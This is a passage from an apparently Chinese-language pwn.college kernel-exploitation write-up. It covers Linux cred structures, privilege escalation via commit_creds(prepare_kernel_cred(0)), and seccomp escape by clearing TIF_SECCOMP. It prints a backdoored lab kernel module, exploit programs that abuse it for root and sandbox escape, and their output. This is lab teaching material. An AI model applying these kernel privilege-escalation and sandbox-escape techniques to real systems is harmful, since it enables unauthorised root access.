class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>		*<span class="hljs-title">real_cred</span>;</span><br><br>	<span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>		*<span class="hljs-title">cred</span>;</span><br>    <span class="hljs-comment">//...</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>task_struct</code>中包含三个<code>cred</code>结构体，该结构体决定了进程的权限。参考该<a target="_blank" rel="noopener" href="https://github.com/g0dA/linuxStack/blob/master/kernel-%E6%9D%83%E9%99%90%E4%B8%8E%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.md">文章</a>，一般情况下，<code>cred</code>决定进程权限；进程间通信时，<code>cred</code>为主体凭证，<code>real_cred</code>为客体凭证，被访问的进程需要使用<code>real_cred</code>来验证对方的权限；<code>ptracer_cred</code>用于<code>ptrace</code>调试时验证<code>tracer</code>的权限防止发送越权。所以大部分情况下，我们关注最下方的<code>cred</code>就够了。</p>
<p><code>cred</code>结构体在linux源码中位于<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.8-rc7/source/include/linux/cred.h"><code>include/linux/cred.h</code></a>,<code>v6.8-rc7</code>的<code>cred</code>源码结合视频省略部份内容后如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>	<span class="hljs-type">atomic_long_t</span>	usage;<br>	<span class="hljs-type">kuid_t</span>		uid;		<span class="hljs-comment">/* real UID of the task */</span><br>	<span class="hljs-type">kgid_t</span>		gid;		<span class="hljs-comment">/* real GID of the task */</span><br>	<span class="hljs-type">kuid_t</span>		suid;		<span class="hljs-comment">/* saved UID of the task */</span><br>	<span class="hljs-type">kgid_t</span>		sgid;		<span class="hljs-comment">/* saved GID of the task */</span><br>	<span class="hljs-type">kuid_t</span>		euid;		<span class="hljs-comment">/* effective UID of the task */</span><br>	<span class="hljs-type">kgid_t</span>		egid;		<span class="hljs-comment">/* effective GID of the task */</span><br>	<span class="hljs-type">kuid_t</span>		fsuid;		<span class="hljs-comment">/* UID for VFS ops */</span><br>	<span class="hljs-type">kgid_t</span>		fsgid;		<span class="hljs-comment">/* GID for VFS ops */</span><br>	<span class="hljs-type">unsigned</span>	securebits;	<span class="hljs-comment">/* SUID-less security management */</span><br>	<span class="hljs-type">kernel_cap_t</span>	cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>	<span class="hljs-type">kernel_cap_t</span>	cap_permitted;	<span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>	<span class="hljs-type">kernel_cap_t</span>	cap_effective;	<span class="hljs-comment">/* caps we can actually use */</span><br>	<span class="hljs-type">kernel_cap_t</span>	cap_bset;	<span class="hljs-comment">/* capability bounding set */</span><br>	<span class="hljs-type">kernel_cap_t</span>	cap_ambient;	<span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-comment">//...</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>将<code>euid</code>置0即可实现对应进程的权限提升。</p>
<p><strong>生成和设置进程的<code>cred</code>结构体</strong></p>
<p>手动构造和修改cred结构体是十分低效且易出错的，我们可以通过内核态的两个API函数快速完成。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> cred * <span class="hljs-title function_">prepare_kernel_cred</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *reference_task_struct)</span>     <span class="hljs-comment">//创建cred结构体</span><br><span class="hljs-title function_">commit_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> cred *)</span>         <span class="hljs-comment">//用参数中的cred结构体替换当前进程的cred结构体</span><br></code></pre></td></tr></table></figure>

<p>调用<code>prepare_kernel_cred</code>时，如果参数为0，则以<code>init</code>进程的<code>cred</code>为模板复制出新的<code>cred</code>；参数指向一个<code>task_struct</code>时，以该<code>task_struct</code>的<code>read_cred</code>为模板复制出新的<code>cred</code>。而<code>init</code>进程是内核启动的第一个用户态进程，拥有几乎不受限制的用户态权限，也就是<code>root</code>。</p>
<p>因此，可以通过<code>prepare_kernel_cred(0)</code>生成一个对应root权限的<code>cred</code>结构体。</p>
<p><strong>cred提权示例</strong></p>
<p><code>make_root.ko</code>示例内核模块的ioctl接口存在后门，当<code>ioctl_num</code>(即原型中的<code>cmd</code>参数)为<code>_IO(&#39;p&#39;, 1)</code>且<code>ioctl_param</code>等于0x13371337时，进行<code>进程权限提升</code>;<code>ioctl_param</code>等于0x31337时，进行<code>seccomp</code>沙箱逃逸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PWN _IO(<span class="hljs-string">&#x27;p&#x27;</span>, 1)</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span><br>&#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Got ioctl argument %d!&quot;</span>, ioctl_num);<br>        <span class="hljs-keyword">if</span> (ioctl_num == PWN)<br>        &#123;<br>                <span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x13371337</span>)<br>                &#123;<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;Granting root access!&quot;</span>);<br>                        commit_creds(prepare_kernel_cred(<span class="hljs-literal">NULL</span>));<br>                &#125;<br>                <span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x31337</span>)<br>                &#123;<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;Escaping seccomp!&quot;</span>);<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS BEFORE: %lx&quot;</span>, current-&gt;thread_info.flags);<br>                        current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS AFTER: %lx&quot;</span>, current-&gt;thread_info.flags);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>仿真环境中装载模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ # insmod make_root.ko<br>[125133.671290] make_root: loading out-of-tree module taints kernel.<br>/ # lsmod<br>make_root 16384 0 - Live 0xffffffffc0000000 (O)<br>/ # ls /proc/pwn-college-root <br>/proc/pwn-college-root<br></code></pre></td></tr></table></figure>

<p>使用objdump反汇编make_root.ko得到<code>_IO(&#39;p&#39;, 1)</code>值为0x7001</p>
<p>宿主机编译并将交互程序放到共享文件夹，交互代码(exp)如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwn-college-root&quot;</span>,<span class="hljs-number">0</span>);<br>        assert(fd&gt;<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BEFORE uid: %d\n&quot;</span>,getuid());<br>        ioctl(fd,<span class="hljs-number">0x7001</span>,<span class="hljs-number">0x13371337</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AFTER uid: %d\n&quot;</span>,getuid());<br>        execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//gcc -o make_root_exp -static make_root_exp.c</span><br></code></pre></td></tr></table></figure>

<p>仿真环境运行exp，提权成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">/home/ctf/Desktop/pwn.college/temp # su ctf<br>sh: can&#x27;t access tty; job control turned off<br>~/Desktop/pwn.college/temp $ id<br>uid=1000(ctf) gid=1000 groups=1000<br>~/Desktop/pwn.college/temp $ ./make_root_exp<br>[128660.788016] Granting root access!<br>BEFORE uid: 1000<br>[128843.406341] Device opened.<br>[128843.411310] Got ioctl argument 28673!<br>AFTER uid: 0<br>/bin/sh: can&#x27;t access tty; job control turned off<br>/home/ctf/Desktop/pwn.college/temp # id<br>uid=0(root) gid=0<br></code></pre></td></tr></table></figure>

<p><strong>获取<code>commit_creds</code>和<code>prepare_kernel_cred</code>在内核中的地址</strong></p>
<p>1.较旧版本内核或关闭了KASLR的内核(例如许多嵌入式设备禁用了KASLR)中，函数映射在可预测的固定地址。</p>
<p>2.<code>/proc/kallsym</code>是内核提供给<code>root</code>用户的符号地址查看接口。</p>
<p>3.如果开启了调试接口，可以使用gdb调试获取地址</p>
<p>4.和用户态一样，泄露KASLR的偏移，通过和固定地址相加的到函数地址</p>
<h3 id="Escaping-Seccomp"><a href="#Escaping-Seccomp" class="headerlink" title="Escaping Seccomp"></a>Escaping Seccomp</h3><p>本节主要讲通过内核漏洞进行seccomp沙箱逃逸</p>
<p>seccomp是一种内核沙箱技术，可以限制系统调用的使用。一个正确设置的沙箱几乎是不可能突破的，除非你能使用特定的系统调用和这些内核模块交互并触发内核漏洞，从seccomp沙箱中逃离。</p>
<p>有大量沙箱逃逸的案例，比如chrome沙箱。该<a target="_blank" rel="noopener" href="https://github.com/allpaca/chrome-sbx-db">github仓库</a>收录了一些2020年及以前的chrome沙箱逃逸漏洞和chrome沙箱逃逸的学习资料。</p>
<p>上节说到的<code>task_struct</code><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.8-rc7/source/include/linux/sched.h">源码</a>中，还存在<code>thread_info</code>结构体，该结构体的<code>flags</code>成员有多个不同作用的比特位，其中一个名为<code>TIF_SECCOMP</code>的比特位定义了seccomp沙箱是否开启。</p>
<p><strong>读源码</strong></p>
<p><code>thread_info</code>在Linux源码中位于<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10/source/arch/x86/include/asm/thread_info.h"><code>/arch/x86/include/asm/thread_info.h</code></a></p>
<p>由于<code>TIF_SECCOMP</code>位在v5.11及之后版本的Linux内核中被回收并迁移，这里改用v5.10的源码。v5.11的具体改动内容在本节最后介绍。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>&#123;</span><br>	<span class="hljs-comment">//LOTS of stuff,including</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">cred</span>;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> &#123;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		flags;		<span class="hljs-comment">/* low level flags */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		syscall_work;	<span class="hljs-comment">/* SYSCALL_WORK_ flags */</span><br>	u32			status;		<span class="hljs-comment">/* thread synchronous flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SMP</span><br>	u32			cpu;		<span class="hljs-comment">/* current CPU */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>flags中第9位(从0开始下标为8)是<code>TIF_SECCOMP</code>位，为1表示开启seccomp，0表示关闭，相关源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIF_SECCOMP		8	<span class="hljs-comment">/* secure computing */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _TIF_SECCOMP		(1 &lt;&lt; TIF_SECCOMP)</span><br></code></pre></td></tr></table></figure>

<p>seccomp启动时相关源码</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10/source/include/linux/seccomp.h#L45">&#x2F;include&#x2F;linux&#x2F;seccomp.h</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">secure_computing</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-keyword">if</span> (unlikely(test_thread_flag(TIF_SECCOMP)))<br>		<span class="hljs-keyword">return</span>  __secure_computing(<span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><a href="/kernel/seccomp.c">&#x2F;kernel&#x2F;seccomp.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __secure_computing(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seccomp_data *sd)<br>&#123;<br>	<span class="hljs-type">int</span> mode = current-&gt;seccomp.mode;<br>	<span class="hljs-type">int</span> this_syscall;<br><br>	<span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &amp;&amp;<br>	    unlikely(current-&gt;ptrace &amp; PT_SUSPEND_SECCOMP))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	this_syscall = sd ? sd-&gt;nr :<br>		syscall_get_nr(current, current_pt_regs());<br><br>	<span class="hljs-keyword">switch</span> (mode) &#123;<br>	<span class="hljs-keyword">case</span> SECCOMP_MODE_STRICT:<br>		__secure_computing_strict(this_syscall);  <span class="hljs-comment">/* may call do_exit */</span><br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">case</span> SECCOMP_MODE_FILTER:<br>		<span class="hljs-keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="hljs-literal">false</span>);<br>	<span class="hljs-keyword">default</span>:<br>		BUG();<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>漏洞利用</strong></p>
<p>要逃出seccomp沙箱，我们只需要在内核空间将当前进程的<code>task_struct</code>-&gt;<code>thread_info</code>-&gt;<code>flags</code>的<code>TIF_SECCOMP</code>位置0.</p>
<p>那么如何得到当前进程的<code>task_struct</code>地址呢？</p>
<p>内核中的段寄存器<code>gs</code>指向了当前进程的<code>task_struct</code>，在内核开发时，我们只需要使用<code>current</code>来指代当前进程的<code>task_struct</code>即可。代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">current-&gt;thread_info.flags &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; TIF_SECCCOMP);<br><span class="hljs-comment">//TIF_SECCOMP = 8 </span><br><span class="hljs-comment">//_TIF_SECCOMP=(1 &lt;&lt; TIF_SECCCOMP)</span><br></code></pre></td></tr></table></figure>

<p>需要注意的是，<strong>子进程依然会开启seccomp</strong>，子进程是否开启seccomp由其它标志位决定。</p>
<p><strong>漏洞利用示例</strong></p>
<p>依旧使用github仓库kernel模块中<code>src</code>目录下的<code>make_root</code>示例内核模块 。</p>
<p>在交互时，将命令码设置为PWN(0x7001)，<code>ioctl_param</code>设置为0x13371337将当前进程提权至root；<code>ioctl_param</code>设置为0x31337关闭seccomp沙箱</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span><br>&#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Got ioctl argument %d!&quot;</span>, ioctl_num);<br>        <span class="hljs-keyword">if</span> (ioctl_num == PWN)<br>        &#123;<br>        	<span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x13371337</span>)<br>        	&#123;<br>        		printk(KERN_ALERT <span class="hljs-string">&quot;Granting root access!&quot;</span>);<br>    			commit_creds(prepare_kernel_cred(<span class="hljs-literal">NULL</span>));<br>    		&#125;<br>    		<span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x31337</span>)<br>    		&#123;<br>        		printk(KERN_ALERT <span class="hljs-string">&quot;Escaping seccomp!&quot;</span>);<br>        		printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS BEFORE: %lx&quot;</span>, current-&gt;thread_info.flags);<br>    			current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;<br>        		printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS AFTER: %lx&quot;</span>, current-&gt;thread_info.flags);<br>    		&#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编写exploit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/sendfile.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BREAKING OUT!\n&quot;</span>);<br>        ioctl(fd,<span class="hljs-number">0x7001</span>,<span class="hljs-number">0x31337</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pre-root uid: %d\n&quot;</span>,getuid());<br>        ioctl(fd,<span class="hljs-number">0x7001</span>,<span class="hljs-number">0x13371337</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Post-root uid: %d\n&quot;</span>,getuid());<br><br>        <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>        assert(flag_fd &gt; <span class="hljs-number">0</span>);<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> n = read(flag_fd, buf, <span class="hljs-number">1024</span>);<br>        assert(n &gt; <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwn-college-root&quot;</span>,<span class="hljs-number">0</span>);<br>        assert(fd&gt;<span class="hljs-number">0</span>);<br><br>        setresuid(<span class="hljs-number">1234</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1234</span>);   <span class="hljs-comment">//降权</span><br><br>        scmp_filter_ctx ctx;<br>        ctx = seccomp_init(SCMP_ACT_ERRNO(<span class="hljs-number">1337</span>));   <span class="hljs-comment">//禁用所有系统调用并返回1337</span><br>        assert(seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(ioctl),<span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);  <span class="hljs-comment">//允许ioctl、read、write</span><br>        assert(seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(read),<span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>        assert(seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(write),<span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>        assert(seccomp_load(ctx) == <span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before breaking out...&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Trying getuid(): %d\n&quot;</span>,getuid());<br><br>        attack(fd);<br>&#125;<br><span class="hljs-comment">//gcc -static -o seccomp_escape seccomp_escape.c -lseccomp</span><br></code></pre></td></tr></table></figure>

<p>编译后在仿真环境中运行，提权和逃逸成功，得到flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">/home/ctf/Desktop/pwn.college/temp # ./seccomp_escape<br>[  787.730808] Device closed.<br>[  849.729537] Device opened.<br>[  849.747593] Got ioctl argument 28673!<br>[  849.747732] Escaping seccomp!<br>[  849.747866] FLAGS BEFORE: 100<br>[  849.747968] FLAGS AFTER: 0<br>[  849.748103] Got ioctl argument 28673!<br>Before breaking out...Trying getuid(): -1337<br>BREAKING OUT!<br>Pre-root uid: 1234<br>Post-root uid: 0<br>pwn_college&#123;31337&#125;<br><br>[  849.748208] Granting root access!<br></code></pre></td></tr></table></figure>





<h4 id="拓展内容-linux内核v5-11相关更新"><a href="#拓展内容-linux内核v5-11相关更新" class="headerlink" title="拓展内容-linux内核v5.11相关更新"></a><strong>拓展内容-linux内核v5.11相关更新</strong></h4><p>笔者在阅读源码时发现，从Linux内核版本<code>v5.11</code>开始，<code>TIF_SECCOMP</code>位已经被去除，也就是说从5.10到5.11做了相应的更新。在<code>Thomas Gleixner</code>向<code>Linus Torvalds</code>提出的<a target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/160799891083.23883.2114675003525545559.pr-tracker-bot@kernel.org/t/#Z2e.:..:160797732939.10793.9152151866806316627.tglx::40nanos:1arch:x86:include:asm:thread_info.h">Linux内核更新建议</a>中，提到了如下回收并转移x86中部分TIF位的建议：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">- The consolidation <span class="hljs-keyword">work</span> <span class="hljs-keyword">to</span> reclaim TIF flags <span class="hljs-keyword">on</span> x86 <span class="hljs-keyword">and</span> <span class="hljs-keyword">also</span> <span class="hljs-keyword">for</span> non-x86    specific TIF flags which are solely relevant <span class="hljs-keyword">for</span> syscall related <span class="hljs-keyword">work</span>    <span class="hljs-keyword">and</span> have been moved <span class="hljs-keyword">into</span> their own <span class="hljs-keyword">storage</span> space. The x86 specific part    had <span class="hljs-keyword">to</span> be merged <span class="hljs-keyword">in</span> <span class="hljs-keyword">to</span> avoid a major <span class="hljs-keyword">conflict</span>.<br></code></pre></td></tr></table></figure>

<p>但是<code>TIP_SECCOMP</code>位并不是<code>Thomas Gleixner</code>删除的，该工作由<code>Gabriel Krisman Bertazi</code>完成。事实上，Linux5.11版本的更新由多人共同完成，如下</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240305205034.png" srcset="/img/loading.gif" lazyload alt="2"></p>
